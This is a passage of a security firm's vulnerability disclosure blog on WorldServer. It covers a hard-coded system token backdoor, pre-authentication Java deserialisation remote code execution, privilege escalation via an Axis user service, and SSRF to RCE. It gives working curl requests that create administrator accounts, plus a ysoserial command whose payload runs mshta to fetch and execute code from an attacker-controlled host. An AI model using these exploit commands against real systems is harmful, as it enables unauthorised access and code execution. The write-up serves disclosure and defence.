<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:314,&quot;335559991&quot;:1}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=825&amp;height=230&amp;name=13.png" width="825" height="230" loading="lazy" alt="13" style="height: auto; max-width: 100%; width: 825px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=413&amp;height=115&amp;name=13.png 413w, https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=825&amp;height=230&amp;name=13.png 825w, https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=1238&amp;height=345&amp;name=13.png 1238w, https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=1650&amp;height=460&amp;name=13.png 1650w, https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=2063&amp;height=575&amp;name=13.png 2063w, https://www.triskelelabs.com/hs-fs/hubfs/13.png?width=2475&amp;height=690&amp;name=13.png 2475w" sizes="(max-width: 825px) 100vw, 825px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">After</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">obtaining</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">source</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">code</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">for</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">WorldServer</span><span data-ccp-parastyle="Body Text">,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">it</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">seems</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">that</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">following</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">function</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">is responsible for</span><span data-ccp-parastyle="Body Text"> the system account backdoor. It performed a check to ensure the token </span><span data-ccp-parastyle="Body Text">wasn’t</span><span data-ccp-parastyle="Body Text"> empty and that the value is equal to 2.</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:247,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314,&quot;335559991&quot;:1}">&nbsp;</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:247,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314,&quot;335559991&quot;:1}"></span></p>
<pre class="code"><code>public static boolean isSystemSessionToken(String token) {
  return (token != null &amp;&amp; token.trim().equals(String.valueOf(2)));
}</code></pre>
<p><span data-contrast="auto">This function seems to be called for several authentication checks from several</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span><span data-contrast="auto">servlets, sometimes with the leading <span style="background-color: #ededed;">0</span> </span><span data-contrast="auto">being stripped from the token. It is for</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:84,&quot;335559739&quot;:0,&quot;335559740&quot;:240,&quot;469777462&quot;:[4329],&quot;469777927&quot;:[0],&quot;469777928&quot;:[1]}">&nbsp;</span><span data-contrast="auto">example possible to call the Apache Axis services with a token of <span style="background-color: #ededed;">2</span> </span><span data-contrast="auto">if it is passed as</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:84,&quot;335559739&quot;:0,&quot;335559740&quot;:240,&quot;469777462&quot;:[7386],&quot;469777927&quot;:[0],&quot;469777928&quot;:[1]}">&nbsp;</span><span data-contrast="auto">a request parameter, rather than <span style="background-color: #ededed;">02</span>, </span><span data-contrast="auto">for example to create a new user:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:85,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<pre><code><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:85,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">http://10.0.0.142:8080/ws-legacy/services/UserWSUserManager?method=createUser_&amp;username=newuser&amp;password=wsadmin&amp;firstName=triskele&amp;lastName=labs&amp;userType=Administrator&amp;token=2</span></code></pre>
<!--<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:0,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://19911083.fs1.hubspotusercontent-na1.net/hubfs/19911083/15.png" width="872" height="130" loading="lazy" alt="15" style="height: auto; max-width: 100%; width: 872px;">&nbsp;</span></p>-->
<p aria-level="1">&nbsp;</p>
<h3 aria-level="1"><strong><span data-contrast="auto">A Dangerous Login - CVE-2022-34268</span></strong><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:238,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p><span data-contrast="auto">Some further enumeration with our hands on the source code led to a few other interesting vulnerabilities. </span></p>
<p><span data-contrast="auto">As with many Java source code reviews, we started with the web.xml file to discern which ingress points were available to the application.</span></p>
<p><span data-contrast="auto">WorldServer users have the option of using the Explorer JNLP application present at <span style="background-color: #ededed;">/ws-legacy/WorldServer-Explorer.jnlp</span> to perform various tasks on the server using the app and the associated GUI.&nbsp;</span></p>
<p><span data-contrast="auto">When this app is in use, it communicates via the<code><span style="background-color: #ededed;">/ws-legacy/clientSupport </span></code>endpoint using serialised Java. An example of this is listed below:&nbsp;</span></p>
<pre id="867ccec6-e36b-49e0-8800-fd52a7d52101"><code>POST /ws-legacy/clientSupport?&amp;token=&lt;redacted&gt; HTTP/1.1<br>Content-type: application/x-java-serialized-object<br>User-Agent: Java/1.8.0_271<br>Host: localhost:8080<br>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br>Content-Length: 188<br>Cookie: JSESSIONID=A824A40654527D78DD983E5D367D35B7<br>Connection: close<br><br>¬í sr 3com.idiominc.ws.message.messages.GetChildrenRequestù}õüDu J lastModifiedI maskL patht Ljava/lang/String;xr com.idiominc.ws.message.RequestóVÝÄÒÄ  xp  7/g<br>t /test</code></pre>
<p><span data-contrast="auto">This endpoint requires authentication, but it is worth noting it is still vulnerable to a Java deserialisation attack by a user with access to any valid credentials. </span></p>
<p><span data-contrast="auto">However, we hunted for other endpoints that might be present that would allow an unauthenticated user to get code execution. After parsing the web.xml file for the <span style="background-color: #ededed;">/ws-legacy</span> path, the <span style="background-color: #ededed;">/clientLogin</span> endpoint returned a curious 802 response code.</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:1,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:1314,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:271,&quot;469777462&quot;:[3683],&quot;469777927&quot;:[0],&quot;469777928&quot;:[1]}">Reviewing the code, we can see that this error is returned in the <span style="background-color: #ededed;">com.idiominc.ws.servlet.ClientSupport</span> class, which is extended by the <span style="background-color: #ededed;">ClientLogin</span> class, if an exception is encountered during request handling:</span></p>
<pre id="d6d14ef1-4d9a-49dd-86c6-785d84662047"><code>public void handle(PageContext pc) throws IOException {<br>    try {<br>      HttpServletRequest req = pc.getRequest();<br>      pc.getWSContext().getAuthorizationContext()<br>        .disableAuthentication(true);<br>      if (!"application/x-java-serialized-object".equals(req.getContentType()))<br>        throw new WSRuntimeException("Illegal mime-type " + req<br>            .getContentType()); <br>      ObjectInputStream ois = new ObjectInputStream((InputStream)req.getInputStream());<br>      Request request = (Request)ois.readObject();<br>      checkRequest(request, pc);<br>      RequestHandler rh = Configuration.getServerRequestHandlerManager().getRequestHandler(request);<br>      Configuration.getLog().log(5, 4, "Processing request: " + request);<br>      Response response = rh.processRequest(request, pc.getWSContext());<br>      if (response.getErrorCode() != -1 &amp;&amp; pc<br>        .getTransaction().isOutstanding())<br>        pc.getTransaction().commit(); <br>      pc.getResponse().setContentType("application/x-java-serialized-object");<br>      pc.getResponse().setHeader("Content-Encoding", "gzip");<br>      ObjectOutputStream oos = new ObjectOutputStream(new GZIPOutputStream((OutputStream)pc.getResponse().getOutputStream()));<br>      oos.writeObject(response);<br>      oos.close();<br>    } catch (ClassNotFoundException e) {<br>      reportError(pc, 800, "Received malformed request", e);<br>    } catch (MessageException e) {<br>      reportError(pc, 801, "Received invalid request", (Throwable)e);<br>    } catch (Throwable e) {<br>      reportError(pc, 802, "Exception encountered during request handling", e);<br>    } <br>  }</code></pre>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">This code seems to deserialise Java objects without any </span><span data-ccp-parastyle="Body Text">sanitisation</span><span data-ccp-parastyle="Body Text"> or authentication, which is </span><span data-ccp-parastyle="Body Text">very exciting</span><span data-ccp-parastyle="Body Text"> from an attacker’s point of view, so we set the </span><span data-ccp-parastyle="Body Text">appropriate</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">content-type</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">header</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">and</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">send</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">POST</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">request</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">with</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">some</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">invalid</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">text, resulting in the following error:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<pre id="f907a524-d859-4ed0-9124-0f2fe75c7ab9"><code>Exception encountered during request handling:<br>java.io.StreamCorruptedException: invalid stream header: 74657374<br>at java.io.ObjectInputStream.readStreamHeader(ObjectInputStream.java:938)<br>at java.io.ObjectInputStream.&amp;lt;init&amp;gt;(ObjectInputStream.java:396)<br>at com.idiominc.ws.servlet.ClientSupport.handle(ClientSupport.java:60)<br>at com.idiominc.ws.servlet.WSHttpServlet.handleServlet(WSHttpServlet.java:388)<br>at com.idiominc.ws.servlet.WSHttpServlet.service(WSHttpServlet.java:155)</code></pre>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">This</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">seems</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">pretty</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">straightforward</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">-</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">so</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">let’s</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">generate</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">serialised</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Java</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">payload</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">and see what happens. Using</span><span data-ccp-parastyle="Body Text">&nbsp; <span style="background-color: #ededed;">ysoserial</span>, </span></span><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">we create another MSHTA payload for our Metasploit server:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:304,&quot;335559991&quot;:1}">&nbsp;</span></p>
<pre id="785e5072-71cb-4385-b743-1623726a3977"><code>java -jar ~/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 'cmd.exe /c mshta http://10.0.0.131:8000/TeXlpKamWoJVqk7.hta' &gt; ping.bin</code></pre>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">Since</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">need</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">send</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">serialised</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">payload</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">in</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">raw</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">format,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">use</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">following curl command:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<pre id="c1de6eae-e7c6-4015-a6d1-785fdc13a428"><code>curl --data-binary @ping.bin http://10.0.0.142:8080/ws-legacy/clientLogin -H "Content-Type: application/x-java-serialized-object"</code></pre>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">This</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">results</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">in</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">command</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">being</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">executed</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">on</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">server,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">confirming</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">have</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Pre-Auth Remote Code Execution by </span><span data-ccp-parastyle="Body Text">POST’ing</span><span data-ccp-parastyle="Body Text"> a raw serialised object:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:71,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:71,&quot;335559739&quot;:0,&quot;335559740&quot;:314}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=581&amp;height=589&amp;name=22.png" width="581" height="589" loading="lazy" alt="22" style="height: auto; max-width: 100%; width: 581px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=291&amp;height=295&amp;name=22.png 291w, https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=581&amp;height=589&amp;name=22.png 581w, https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=872&amp;height=884&amp;name=22.png 872w, https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=1162&amp;height=1178&amp;name=22.png 1162w, https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=1453&amp;height=1473&amp;name=22.png 1453w, https://www.triskelelabs.com/hs-fs/hubfs/22.png?width=1743&amp;height=1767&amp;name=22.png 1743w" sizes="(max-width: 581px) 100vw, 581px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">Shell:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=808&amp;height=227&amp;name=23.png" width="808" height="227" loading="lazy" alt="23" style="height: auto; max-width: 100%; width: 808px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=404&amp;height=114&amp;name=23.png 404w, https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=808&amp;height=227&amp;name=23.png 808w, https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=1212&amp;height=341&amp;name=23.png 1212w, https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=1616&amp;height=454&amp;name=23.png 1616w, https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=2020&amp;height=568&amp;name=23.png 2020w, https://www.triskelelabs.com/hs-fs/hubfs/23.png?width=2424&amp;height=681&amp;name=23.png 2424w" sizes="(max-width: 808px) 100vw, 808px"></span></p>
<h3 aria-level="1"><strong><span data-contrast="auto">Privilege Escalation Via UserWSUserManager - CVE- 2022-34270</span></strong><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:328,&quot;335559738&quot;:89,&quot;335559739&quot;:0,&quot;335559740&quot;:244}">&nbsp;</span></h3>
<p><span data-contrast="auto">The same Apache Axis service we used earlier to create a new user using the authentication bypass via the system account seems to be vulnerable to a privilege escalation issue as well since regular users can use the same endpoint to create a new user, including users with the Administrator role.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-contrast="auto">To verify this, we created a new ‘Translator’ user account:</span></p>
<p><span data-contrast="auto"><img src="https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=631&amp;height=523&amp;name=24.png" width="631" height="523" loading="lazy" alt="24" style="height: auto; max-width: 100%; width: 631px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=316&amp;height=262&amp;name=24.png 316w, https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=631&amp;height=523&amp;name=24.png 631w, https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=947&amp;height=785&amp;name=24.png 947w, https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=1262&amp;height=1046&amp;name=24.png 1262w, https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=1578&amp;height=1308&amp;name=24.png 1578w, https://www.triskelelabs.com/hs-fs/hubfs/24.png?width=1893&amp;height=1569&amp;name=24.png 1893w" sizes="(max-width: 631px) 100vw, 631px"></span></p>
<p><span data-contrast="auto"><span data-contrast="auto" xml:lang="EN-US" lang="EN-US">After logging in, we obtained the token:</span>&nbsp;</span></p>
<p><span data-contrast="auto"><img src="https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=776&amp;height=456&amp;name=25.png" width="776" height="456" loading="lazy" alt="25" style="height: auto; max-width: 100%; width: 776px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=388&amp;height=228&amp;name=25.png 388w, https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=776&amp;height=456&amp;name=25.png 776w, https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=1164&amp;height=684&amp;name=25.png 1164w, https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=1552&amp;height=912&amp;name=25.png 1552w, https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=1940&amp;height=1140&amp;name=25.png 1940w, https://www.triskelelabs.com/hs-fs/hubfs/25.png?width=2328&amp;height=1368&amp;name=25.png 2328w" sizes="(max-width: 776px) 100vw, 776px"></span></p>
<p><span data-ccp-parastyle="Body Text">And</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">used</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">it</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">create</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">new</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">admin</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">user</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">(Apache</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Axis</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">services</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">can</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">usually</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">be</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">called via both GET and POST, as </span><span data-ccp-parastyle="Body Text">demonstrated</span><span data-ccp-parastyle="Body Text"> here):</span></p>
<pre id="8ee0e59d-3a9d-47bd-aff2-62f3fe01648a"><code>curl "http://10.0.0.142:8080/ws-legacy/services/UserWSUserManager?method=createUser_&amp;username=newuser2&amp;password=wsadmin&amp;firstName=triskele&amp;lastName=admin&amp;userType=Administrator&amp;token=164166319"</code></pre>
<p><span data-ccp-parastyle="Body Text">Lo and behold, our fresh admin </span><span data-ccp-parastyle="Body Text">user:</span></p>
<p><span data-ccp-parastyle="Body Text"><img src="https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=614&amp;height=242&amp;name=27.png" width="614" height="242" loading="lazy" alt="27" style="height: auto; max-width: 100%; width: 614px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=307&amp;height=121&amp;name=27.png 307w, https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=614&amp;height=242&amp;name=27.png 614w, https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=921&amp;height=363&amp;name=27.png 921w, https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=1228&amp;height=484&amp;name=27.png 1228w, https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=1535&amp;height=605&amp;name=27.png 1535w, https://www.triskelelabs.com/hs-fs/hubfs/27.png?width=1842&amp;height=726&amp;name=27.png 1842w" sizes="(max-width: 614px) 100vw, 614px"></span></p>
<p><span data-contrast="auto">From here, RCE is trivial using any of the other techniques described in this blog post.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:247,&quot;335559738&quot;:71,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p>&nbsp;</p>
<h3 aria-level="1"><strong><span data-contrast="auto">Authenticated Blind SSRF to RCE - CVE-2022-34269</span></strong><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">The&nbsp; <span style="background-color: #ededed;">com.idiominc.ws.servlet.LoadDTD</span> &nbsp;class, found at&nbsp; <span style="background-color: #ededed;">/ws-legacy/load_dtd</span> allows users </span><span data-contrast="auto">with access to the application, including low-privileged users, to perform a blind</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:84,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"> </span><span data-contrast="auto">Server-Side Request Forgery using the</span><span> <span style="background-color: #ededed;">system_id</span>&nbsp;</span><span data-contrast="auto">parameter. </span></p>
<p><span data-contrast="auto">The following curl command can be used to perform a GET request to any host, internal or external:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<pre id="7a54d709-1f17-4ad1-8524-70b38b97a569"><code>curl "http://10.0.0.142:8080/ws-legacy/load_dtd?system_id=http://HOST&amp;token=TOKENHERE" -v</code></pre>
<p><span data-contrast="auto">This can be used to send a request to the Apache Axis AdminService listening on the local host as this service doesn’t require authentication when called locally. Using </span><a href="https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce"><span data-contrast="auto">the techniques described in </span><span data-contrast="auto">htt</span><span data-contrast="auto">p</span><span data-contrast="auto">s://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-</span><span data-contrast="auto"> </span><span data-contrast="auto">rce</span><span data-contrast="auto">,</span></a><span data-contrast="auto"> this can be used to upload a new JSP file, resulting in code execution on the host as a low-privilege user.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:142,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
